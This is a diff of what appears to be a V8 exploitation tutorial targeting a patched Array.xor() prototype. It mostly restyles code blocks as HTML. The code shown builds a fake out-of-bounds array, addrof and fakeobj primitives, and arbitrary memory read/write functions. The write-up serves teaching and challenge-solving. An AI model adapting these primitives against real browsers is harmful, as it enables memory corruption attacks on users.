@@ -178,7 +178,14 @@ The patch adds a new **Array.xor()** prototype that can be used to xor all value
 	padding: 1px;
 	width: calc(100% - 8px);
 	border-radius: 4px;
-	/* border-bottom: 1px solid #5E5E5E; */
+}
+.jsConCode {
+	min-height: 14px;
+	margin: 3px;
+	padding: 7px;
+	width: calc(100% - 20px);
+	border-radius: 4px;
+	white-space: pre-wrap;
 }
 .jsConLine:has(details) {
 	text-wrap: nowrap;
@@ -831,71 +838,71 @@ In JavaScript exploitation, a memory corruption is usually turned into the **add
 
 Let's take our research so far and wrap it up in a nice little script.
 
-```js
-// set up helper stuff
-const buffer = new ArrayBuffer(8);
-const floatBuffer = new Float64Array(buffer);
-const int64Buffer = new BigUint64Array(buffer);
-
-// bigint to double
-function i2f(i) {
-  int64Buffer[0] = i;
-  return floatBuffer[0];
+<div class="jsConsole">
+	<div class="jsConCode"><span class="jsConNull">// set up helper stuff</span>
+<span class="jsConKw">const</span> <span class="jsConIdx">buffer</span> = <span class="jsConKw">new</span> <span class="jsConVar">ArrayBuffer</span>(<span class="jsConValIn">8</span>);
+<span class="jsConKw">const</span> <span class="jsConIdx">floatBuffer</span> = <span class="jsConKw">new</span> <span class="jsConVar">Float64Array</span>(<span class="jsConVar">buffer</span>);
+<span class="jsConKw">const</span> <span class="jsConIdx">int64Buffer</span> = <span class="jsConKw">new</span> <span class="jsConVar">BigUint64Array</span>(<span class="jsConVar">buffer</span>);
+<!---->
+<span class="jsConNull">// bigint to double</span>
+<span class="jsConKw">function</span> <span class="jsConIdx">i2f</span>(<span class="jsConIdx">i</span>) {
+  <span class="jsConVar">int64Buffer</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">i</span>;
+  <span class="jsConKw">return</span> <span class="jsConVar">floatBuffer</span>[<span class="jsConValIn">0</span>];
 }
-
-// double to bigint
-function f2i(f) {
-  floatBuffer[0] = f;
-  return int64Buffer[0];
+<!---->
+<span class="jsConNull">// double to bigint</span>
+<span class="jsConKw">function</span> <span class="jsConIdx">f2i</span>(<span class="jsConIdx">f</span>) {
+  <span class="jsConVar">floatBuffer</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">f</span>;
+  <span class="jsConKw">return</span> <span class="jsConVar">int64Buffer</span>[<span class="jsConValIn">0</span>];
 }
-
-// bigint to 32-bit hex string
-function hex32(i) {
-  return "0x" + i.toString(16).padStart(8, 0);
+<!---->
+<span class="jsConNull">// bigint to 32-bit hex string</span>
+<span class="jsConKw">function</span> <span class="jsConIdx">hex32</span>(<span class="jsConIdx">i</span>) {
+  <span class="jsConKw">return</span> <span class="jsConStr">"0x"</span> + <span class="jsConVar">i</span>.<span class="jsConFun">toString</span>(<span class="jsConValIn">16</span>).<span class="jsConFun">padStart</span>(<span class="jsConValIn">8</span>, <span class="jsConValIn">0</span>);
 }
-
-// bigint to 64-bit hex string
-function hex64(i) {
-  return "0x" + i.toString(16).padStart(16, 0);
+<!---->
+<span class="jsConNull">// bigint to 64-bit hex string</span>
+<span class="jsConKw">function</span> <span class="jsConIdx">hex64</span>(<span class="jsConIdx">i</span>) {
+  <span class="jsConKw">return</span> <span class="jsConStr">"0x"</span> + <span class="jsConVar">i</span>.<span class="jsConFun">toString</span>(<span class="jsConValIn">16</span>).<span class="jsConFun">padStart</span>(<span class="jsConValIn">16</span>, <span class="jsConValIn">0</span>);
 }
-
-// set up variables
-const arr = [1.1, 2.2, 3.3];
-const tmpObj = {a: 1};
-const objArr = [tmpObj];
-
-// check the address of arr
-%DebugPrint(arr);
-
-// set up the fake array
-const arrAddr = 0x12345678n;
-const arrElementsAddr = arrAddr - 0x20n;
-const fakeAddr = arrElementsAddr + 0x10n;
-const fakeElementsAddr = arrElementsAddr + 0x8n;
-arr[0] = i2f(0x00000100000008a9n);
-arr[1] = i2f(0x00000725001cb7c5n);
-arr[2] = i2f(0x0000010000000000n + fakeElementsAddr);
-
-// do the exploit
-const tmp = [1.1];
-const evil = {
-  valueOf: () => {
-    tmp[0] = arr;
-    return Number(arrAddr ^ fakeAddr);
+<!---->
+<span class="jsConNull">// set up variables</span>
+<span class="jsConKw">const</span> <span class="jsConIdx">arr</span> = [<span class="jsConValIn">1.1</span>, <span class="jsConValIn">2.2</span>, <span class="jsConValIn">3.3</span>];
+<span class="jsConKw">const</span> <span class="jsConIdx">tmpObj</span> = {<span class="jsConFun">a</span>: <span class="jsConValIn">1</span>};
+<span class="jsConKw">const</span> <span class="jsConIdx">objArr</span> = [<span class="jsConVar">tmpObj</span>];
+<!---->
+<span class="jsConNull">// check the address of arr</span>
+%<span class="jsConVar">DebugPrint</span>(<span class="jsConVar">arr</span>);
+<!---->
+<span class="jsConNull">// set up the fake array</span>
+<span class="jsConKw">const</span> <span class="jsConIdx">arrAddr</span> = <span class="jsConValIn">0x12345678n</span>;
+<span class="jsConKw">const</span> <span class="jsConIdx">arrElementsAddr</span> = <span class="jsConVar">arrAddr</span> - <span class="jsConValIn">0x20n</span>;
+<span class="jsConKw">const</span> <span class="jsConIdx">fakeAddr</span> = <span class="jsConVar">arrElementsAddr</span> + <span class="jsConValIn">0x10n</span>;
+<span class="jsConKw">const</span> <span class="jsConIdx">fakeElementsAddr</span> = <span class="jsConVar">arrElementsAddr</span> + <span class="jsConValIn">0x8n</span>;
+<span class="jsConVar">arr</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">i2f</span>(<span class="jsConValIn">0x00000100000008a9n</span>);
+<span class="jsConVar">arr</span>[<span class="jsConValIn">1</span>] = <span class="jsConVar">i2f</span>(<span class="jsConValIn">0x00000725001cb7c5n</span>);
+<span class="jsConVar">arr</span>[<span class="jsConValIn">2</span>] = <span class="jsConVar">i2f</span>(<span class="jsConValIn">0x0000010000000000n</span> + <span class="jsConVar">fakeElementsAddr</span>);
+<!---->
+<span class="jsConNull">// do the exploit</span>
+<span class="jsConKw">const</span> <span class="jsConIdx">tmp</span> = [<span class="jsConValIn">1.1</span>];
+<span class="jsConKw">const</span> <span class="jsConIdx">evil</span> = {
+  <span class="jsConFun">valueOf</span>: () =&gt; {
+    <span class="jsConVar">tmp</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">arr</span>;
+    <span class="jsConKw">return</span> <span class="jsConVar">Number</span>(<span class="jsConVar">arrAddr</span> ^ <span class="jsConVar">fakeAddr</span>);
   }
 };
-tmp.xor(evil);
-
-// this is the fake 128-element array
-const oob = tmp[0];
-
-// print out the data in the fake array
-for (let i = 0; i < oob.length; i++) {
-  const addr = hex32(fakeElementsAddr + BigInt(i + 1)*0x8n - 1n);
-  const val = hex64(f2i(oob[i]));
-  console.log(`${addr}: ${val}`);
-}
-```
+<span class="jsConVar">tmp</span>.<span class="jsConFun">xor</span>(<span class="jsConVar">evil</span>);
+<!---->
+<span class="jsConNull">// this is the fake 128-element array</span>
+<span class="jsConKw">const</span> <span class="jsConIdx">oob</span> = <span class="jsConVar">tmp</span>[<span class="jsConValIn">0</span>];
+<!---->
+<span class="jsConNull">// print out the data in the fake array</span>
+<span class="jsConKw">for</span> (<span class="jsConKw">let</span> <span class="jsConIdx">i</span> = <span class="jsConValIn">0</span>; <span class="jsConVar">i</span> &lt; <span class="jsConVar">oob</span>.<span class="jsConFun">length</span>; <span class="jsConVar">i</span>++) {
+  <span class="jsConKw">const</span> <span class="jsConIdx">addr</span> = <span class="jsConVar">hex32</span>(<span class="jsConVar">fakeElementsAddr</span> + <span class="jsConVar">BigInt</span>(<span class="jsConVar">i</span> + <span class="jsConValIn">1</span>)*<span class="jsConValIn">0x8n</span> - <span class="jsConValIn">1n</span>);
+  <span class="jsConKw">const</span> <span class="jsConIdx">val</span> = <span class="jsConVar">hex64</span>(<span class="jsConVar">f2i</span>(<span class="jsConVar">oob</span>[<span class="jsConVar">i</span>]));
+  <span class="jsConVar">console</span>.<span class="jsConFun">log</span>(<span class="jsConStr">`</span>${<span class="jsConVar">addr</span>}<span class="jsConStr">: </span>${<span class="jsConVar">val</span>}<span class="jsConStr">`</span>);
+}</div>
+</div>
 
 The beginning of the script sets up some helper functions. Then we create an array to store our fake array in as before, and also another array that has a random object in it.
 
@@ -932,66 +939,76 @@ Neat! If we stare at the patterns in the memory we can make out the other arrays
 
 Let's write the primitives to get and set the upper 32 bits:
 
-```js
-function addrof(o) {
-  objArr[0] = o;
-  return f2i(oob[10]) >> 32n;
+<div class="jsConsole">
+	<div class="jsConCode"><span class="jsConKw">function</span> <span class="jsConIdx">addrof</span>(<span class="jsConIdx">o</span>) {
+  <span class="jsConVar">objArr</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">o</span>;
+  <span class="jsConKw">return</span> <span class="jsConVar">f2i</span>(<span class="jsConVar">oob</span>[<span class="jsConValIn">10</span>]) >> <span class="jsConValIn">32n</span>;
 }
-
-function fakeobj(a) {
-  const temp = f2i(oob[10]) & 0xFFFFFFFFn;
-  oob[10] = i2f(temp + (a << 32n));
-  return objArr[0];
-}
-```
+<!---->
+<span class="jsConKw">function</span> <span class="jsConIdx">fakeobj</span>(<span class="jsConIdx">a</span>) {
+  <span class="jsConKw">const</span> <span class="jsConIdx">temp</span> = <span class="jsConVar">f2i</span>(<span class="jsConVar">oob</span>[<span class="jsConValIn">10</span>]) & <span class="jsConValIn">0xFFFFFFFFn</span>;
+  <span class="jsConVar">oob</span>[<span class="jsConValIn">10</span>] = <span class="jsConVar">i2f</span>(<span class="jsConVar">temp</span> + (<span class="jsConVar">a</span> &lt;&lt; <span class="jsConValIn">32n</span>));
+  <span class="jsConKw">return</span> <span class="jsConVar">objArr</span>[<span class="jsConValIn">0</span>];
+}</div>
+</div>
 
 If the address was at the lower bits, we'd need to modify the code a bit:
 
-
-```js
-function addrof(o) {
-  objArr[0] = o;
-  return f2i(oob[10]) & 0xFFFFFFFFn;
+<div class="jsConsole">
+	<div class="jsConCode"><span class="jsConKw">function</span> <span class="jsConIdx">addrof</span>(<span class="jsConIdx">o</span>) {
+  <span class="jsConVar">objArr</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">o</span>;
+  <span class="jsConKw">return</span> <span class="jsConVar">f2i</span>(<span class="jsConVar">oob</span>[<span class="jsConValIn">10</span>]) & <span class="jsConValIn">0xFFFFFFFFn</span>;
 }
+<!---->
+<span class="jsConKw">function</span> <span class="jsConIdx">fakeobj</span>(<span class="jsConIdx">a</span>) {
+  <span class="jsConKw">const</span> <span class="jsConIdx">temp</span> = <span class="jsConVar">f2i</span>(<span class="jsConVar">oob</span>[<span class="jsConValIn">10</span>]) & <span class="jsConValIn">0xFFFFFFFF00000000n</span>;
+  <span class="jsConVar">oob</span>[<span class="jsConValIn">10</span>] = <span class="jsConVar">i2f</span>(<span class="jsConVar">temp</span> + <span class="jsConVar">a</span>);
+  <span class="jsConKw">return</span> <span class="jsConVar">objArr</span>[<span class="jsConValIn">0</span>];
+}</div>
+</div>
 
-function fakeobj(a) {
-  const temp = f2i(oob[10]) & 0xFFFFFFFF00000000n;
-  oob[10] = i2f(temp + a);
-  return objArr[0];
-}
-```
+Time to try them out! Let's do an experiment where we first try to get the address of our fake array, and then turn that address into a new pointer to that array.
 
-Time to try them out! Let's do an experiment where we first try to get the address of our fake array, and then turn that address into a pointer to our array.
-
-```js
-...
-> hex32(addrof(oob))
-< 0x000432e9
-> fakeArray = fakeobj(0x000432e9n)
-> fakeArray
-< (128) [3.88113e-311, 5.43231e-312, 3.88113e-311, 1.27321e-313, ...]
-```
+<div class="jsConsole">
+	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">hex32</span>(<span class="jsConVar">addrof</span>(<span class="jsConVar">oob</span>))</div>
+	<div class="jsConBorder"></div>
+	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 8,11 4,7 8,3 8.85,3.85 5.7,7 8.85,10.15 Z"/><circle cx="10" cy="7" r="1"/></svg><span class="jsConValOut">0x000432e9</span></div>
+	<div class="jsConBorder"></div>
+	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">fakeArray</span> = <span class="jsConVar">fakeobj</span>(<span class="jsConValIn">0x000432e9n</span>)</div>
+	<div class="jsConBorder"></div>
+	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 6.4,11 5.55,10.15 8.7,7 5.55,3.85 6.4,3 l 4,4 z"/></svg><span class="jsConVar">fakeArray</span></div>
+	<div class="jsConBorder"></div>
+	<div class="jsConLine"><svg class="jsConIcon" xmlns="http://www.w3.org/2000/svg"><path d="M 8,11 4,7 8,3 8.85,3.85 5.7,7 8.85,10.15 Z"/><circle cx="10" cy="7" r="1"/></svg><details><summary><i>(128) [<span class="jsConValOut">3.881131231533e-311</span>, <span class="jsConValOut">5.432310575454e-312</span>, <span class="jsConValOut">3.881131231533e-311</span>, <span class="jsConValOut">1.27321098e-313</span>, (124&nbsp;more)...]</i></summary>
+<div style="padding-left: 24px">
+<span class="jsConIdx jsConB">0</span>: <span class="jsConValOut">0x00000725001cb7c5</span><br/>
+<span class="jsConIdx jsConB">1</span>: <span class="jsConValOut">0x0000010000042bd1</span><br/>
+<span class="jsConIdx jsConB">2</span>: <span class="jsConValOut">0x00000725001cb7c5</span><br/>
+<span class="jsConIdx jsConB">3</span>: <span class="jsConValOut">0x0000000600042bc9</span><br/>
+<span style="padding-left: 4px"><i>(124&nbsp;more)...</i><br/></span>
+</div>
+	</details></div>
+</div>
 
 Sweet! The pointer addresses here are tagged, so they're 1 bigger than the actual memory locations. We could make addrof and fakeobj subtract and add 1 to see and use the actual memory addresses, but it's a matter of taste.
 
 Lastly we'll want to create primitives to arbitrarily **read** and **write** memory. To do that, we can create a new array, point it at any memory location we desire, and then read or write its first element. Although we did set the length of an array in two separate memory locations earlier, it turns out this isn't always required depending on what we want to do. If we just want to read or write a single double, we can just specify the desired address in the array header and it'll do the trick.
 
-```js
-function read(addr) {
-  const readArr = [1.1, 2.2];
-  readArr[0] = i2f(0x00000725001cb7c5n);
-  readArr[1] = i2f(0x0000000200000000n + addr - 0x8n);
-  return f2i(fakeobj(addrof(readArr) - 0x10n)[0]);
+<div class="jsConsole">
+	<div class="jsConCode"><span class="jsConKw">function</span> <span class="jsConIdx">read</span>(<span class="jsConIdx">addr</span>) {
+  <span class="jsConKw">const</span> <span class="jsConIdx">readArr</span> = [<span class="jsConValIn">1.1</span>, <span class="jsConValIn">2.2</span>];
+  <span class="jsConVar">readArr</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">i2f</span>(<span class="jsConValIn">0x00000725001cb7c5n</span>);
+  <span class="jsConVar">readArr</span>[<span class="jsConValIn">1</span>] = <span class="jsConVar">i2f</span>(<span class="jsConValIn">0x0000000200000000n</span> + <span class="jsConVar">addr</span> - <span class="jsConValIn">0x8n</span>);
+  <span class="jsConKw">return</span> <span class="jsConVar">f2i</span>(<span class="jsConVar">fakeobj</span>(<span class="jsConVar">addrof</span>(<span class="jsConVar">readArr</span>) - <span class="jsConValIn">0x10n</span>)[<span class="jsConValIn">0</span>]);
 }
-
-function write(addr, data) {
-  const writeArr = [1.1, 2.2];
-  writeArr[0] = i2f(0x00000725001cb7c5n);
-  writeArr[1] = i2f(0x0000000200000000n + addr - 0x8n);
-  const fakeArr = fakeobj(addrof(writeArr) - 0x10n);
-  fakeArr[0] = i2f(data);
-}
-```
+<!---->
+<span class="jsConKw">function</span> <span class="jsConIdx">write</span>(<span class="jsConIdx">addr</span>, <span class="jsConIdx">data</span>) {
+  <span class="jsConKw">const</span> <span class="jsConIdx">writeArr</span> = [<span class="jsConValIn">1.1</span>, <span class="jsConValIn">2.2</span>];
+  <span class="jsConVar">writeArr</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">i2f</span>(<span class="jsConValIn">0x00000725001cb7c5n</span>);
+  <span class="jsConVar">writeArr</span>[<span class="jsConValIn">1</span>] = <span class="jsConVar">i2f</span>(<span class="jsConValIn">0x0000000200000000n</span> + <span class="jsConVar">addr</span> - <span class="jsConValIn">0x8n</span>);
+  <span class="jsConKw">const</span> <span class="jsConIdx">fakeArr</span> = <span class="jsConVar">fakeobj</span>(<span class="jsConVar">addrof</span>(<span class="jsConVar">writeArr</span>) - <span class="jsConValIn">0x10n</span>);
+  <span class="jsConVar">fakeArr</span>[<span class="jsConValIn">0</span>] = <span class="jsConVar">i2f</span>(<span class="jsConVar">data</span>);
+}</div>
+</div>
 
 Did you know that strings in JavaScript are immutable! Anyways let's mutate them using the cool new functions we cooked up.
 
